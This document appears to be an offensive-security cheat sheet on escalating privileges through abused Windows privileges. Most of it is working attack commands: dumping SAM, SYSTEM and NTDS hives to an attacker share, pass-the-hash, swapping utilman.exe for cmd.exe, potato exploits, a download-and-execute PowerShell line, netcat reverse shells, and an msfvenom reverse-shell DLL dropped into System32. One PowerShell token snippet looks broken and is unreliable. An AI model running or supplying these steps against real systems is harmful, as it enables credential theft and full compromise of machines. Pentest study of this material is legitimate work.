# Windows Privileges

## Privilege check command: whoami /priv

## Examples of dangerous privileges:

### SeBackup/SeRestore

#### 1: Backup SAM and SYSTEM hashes

    cd /

    mkdir temp

    cd temp

    req save hklm\system c:\temp\system

    req save hklm\sam c:\temp\sam

    download sam

    download system

#### 2: Create SMB Server on attacking machine

    mkdir share

    impacket-smbserver -smb2support -username USER -password PASSWORD public share

#### 3: Copy backups to share folder

    copy c:\users\user\sam.hive \\ATTACK_IP\public\

    copy c:\users\user\system.hive \\ATTACK_IP\public\

#### 4: Retrieve hashes

    impacket-secretsdump -sam sam.hive -system system.hive LOCAL

## OR 

    pypykatz registry --sam sam system

#### 5: Pass-The-Hash Attack (PtH)

    impacket-psexec -hashes HASH administrator@TARGET_IP

#### TIP: We can also use evil-winrm for PtH attacks.

    evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'

#### Mimikatz

    sekurlsa:pth /user:Administrator /ntlm:NTLM_HASH /domain:DOMAIN /run:powershell.exe

## Alternate Method to transfer the Hives: reg.py  remotely on Linux

    python smbserver.py -smb2support share /tmp

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'

    reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'

## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege

### Usage:

    Import-Module .\SeBackupPrivilegeUtils.dll

    Import-Module .\SeBackupPrivilegeCmdLets.dll

    Set-SeBackupPrivilege

    Get-SeBackupPrivilege

## Alternate Method: Robocopy

    robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B

    type C:\Users\Public\root.txt

## Alternate Method: Volume Shadow Copy

#### 1) On our machine, create a .dsh file that will automate the process.

    nano pwn.dsh

#### 2) File contents

    set context persistent nowriters
    add volume c: alias pwn
    create
    expose %pwn% z:

#### 3) Convert the file to a Windows-compatible format

    unix2dos pwn.dsh

#### 4) Upload the file, then run it with diskshadow

    diskshadow /s pwn.dsh

#### 5) Transfer the ntds.dit file from Z: to Temp directory

    robocopy /b z:\windows\ntds . ntds.dit

#### 6) Extract the SYSTEM hive, then download it for offline hash dumping with impacket

    reg save hklm\system c:\Temp\system

#### 7) Dump hashes

    impacket-secretsdump -ntds ntds.dit -system system local

## SeTakeOwnership

#### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.

### Example: Utilman.exe

#### 1: 

    takeown /f c:\windows\system32\utilman.exe

#### 2: 

    icacls c:\windows\system32\utilman.exe /grant "%username%":F

#### 3: 

    ren "%windir%\system32\cmd.exe" utilman.exe

#### 4: Trigger utilman : Lock screen, click ease of access

    Lock the console, press Win+U to open the renamed utilman.exe (now cmd.exe) as SYSTEM.

## SeImpersonate/SeAssignPrimaryToken

### A lot of potato exploits work with these privileges, so in our example we will talk about RoguePotato.

#### RogueWinRM.exe exploit

#### 1: Start listener

    c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"

## Tool: PrintSpoofer

## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

## Tool: Invoke-BadPotato

## Link: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1

Download the script on our target machine

    iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-BadPotato.ps1')

Run the script to get system

    Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe ATTACK_IP PORT"

## Tool: RottenPotato

    RottenPotato.exe -r -c "cmd.exe"

## SeDebug Privilege

### Tools: Meterpreter, https://github.com/decoder-it/psgetsystem

### Steps:

#### 1) 

    Get-Process winlogon (Check for a specific SYSTEM level process running on the machine)

#### 2) Download and execute Meterpreter on target machine to connect to us

#### 3) 

    ps (Check for processes running as SYSTEM. Example: winlogon.exe)

#### 4) 

    migrate PID (Take ownership of the elevated process)

#### 5) VOILA!

### Alternate method: Powershell

Use powershell to duplicate the lsass.exe token (example)

    $ProcessId = (Get-Process lsass).Id
    $ProcessHandle = [System.Diagnostics.Process]::GetProcessById($ProcessId).Handle
    $TokenHandle = New-Object System.IntPtr
    
    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.IntPtr]::Zero,[System.Type]::GetType('System.Delegate'))
    $DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.IntPtr]::Zero,[System.Type]::GetType('System.Delegate'))
    
    $OpenProcessToken.Invoke($ProcessHandle, 2, [ref]$TokenHandle)
    $DuplicateTokenEx.Invoke($TokenHandle, 2, $Null, 2, 1, [ref]$TokenHandle)

## TIP: If the SeDebug Privilege is disabled, we can enable it with psgetsystem powershell script (Link attached at the top of this attack's explanation)

### Alternate Method for SeImpersonate and SeDebug: 

https://github.com/0xCyberY/Exploit-SeImpersonatePrivilege-and-SeDebugPrivilege

## SeCreatePagefile

This privilege allows a user to create and modify the paging file. Exploit this privilege by gaining access to sensitive information by creating or modifying the hibernation file to analyze offline.

    hiberfil.sys

### Steps:

#### 1) Enable hibernation

    powercfg /hibernate on
    powercfg /hibernate /size 100 (Optional. Set hibernation file size if needed.)

#### 2) After a reboot, the hiberfil.sys file will be created in the root of the system drive. Use volatility to analyze the hiberfil.sys file.

Identify the profile and image type

    volatility -f C:\hiberfil.sys imageinfo

List registry hives

    volatility -f C:\hiberfil.sys hivelist

Dump hashes from the registry

    volatility -f C:\hiberfil.sys hashdump

# SeLoadDriver

This privilege allows users to load and unload device drivers.

## Steps

#### 1) Load a vulnerable driver

    sc.exe create szkg64.sys binPath=C:\windows\temp\szkg64.sys type=kernel  start= demand

#### 2) Start the vulnerable driver

    sc.exe start szkg64.sys

# SeRelabel

This privilege allows users to modify the integrity labels of system files.

#### 1) Change the integrity label of a file

    icacls.exe "C:\Path\To\SystemFile" /setintegritylevel High

# SeTrustedCredManAccess

Access stored credentials in Credential Manager to obtain sensitive information

#### Access Credential Manager in Powershell

    Get-StoredCredential -Target "SomeCredential"

# SeManageVolumeAbuse

With this privilege, an attacker can gain full control over C:\ by crafting and placing a malicious .dll file in C:\Windows\System32\

Link: https://github.com/emmasolis1/OSCP/blob/main/04.privilege_escalation/windows/SeManageVolumeExploit.exe

### 1) Check for permission

    whoami /priv

### 2) Download and run the executable on target

    .\SeManageVolumeExploit

### 3) Create the malicious DLL

    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll

### 4) Transfer the DLL to the victim in C:\Windows\System32\wbem\tzres.dll

    iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"

### 5) Setup listener

    nc -lvnp 4444

### 6) Run systeminfo to trigger the DLL

    systeminfo
